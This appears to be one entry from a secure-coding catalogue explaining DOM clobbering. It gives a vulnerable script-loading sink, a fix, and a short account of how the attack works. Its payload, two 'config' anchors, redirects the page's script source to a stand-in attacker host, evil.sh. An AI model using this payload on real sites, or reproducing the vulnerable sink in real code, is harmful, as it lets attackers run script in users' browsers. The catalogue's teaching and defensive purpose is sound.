---
order: 10
cwe: 79
title: DOM clobbering
category: injection
severity: medium
sink: |-
    script.src = window.config?.cdn || "/static/app.js"
payload: |-
    <a id="config"></a>
    <a id="config" name="cdn" href="//evil.sh/x.js"></a>
fix: |
    // never read globals the markup can name
    const config = JSON.parse(document.getElementById("config-json").textContent);
refs:
    - https://portswigger.net/web-security/dom-based/dom-clobbering
---

Elements with `id` or `name` become properties of `window` and `document`. Two `config` anchors form a collection, `config.cdn` picks the named one, and an anchor stringifies to its `href`. Sanitizers keep "harmless" anchors and forms, so markup alone can replace a global your script trusts — and turn a script-free injection into script loading.
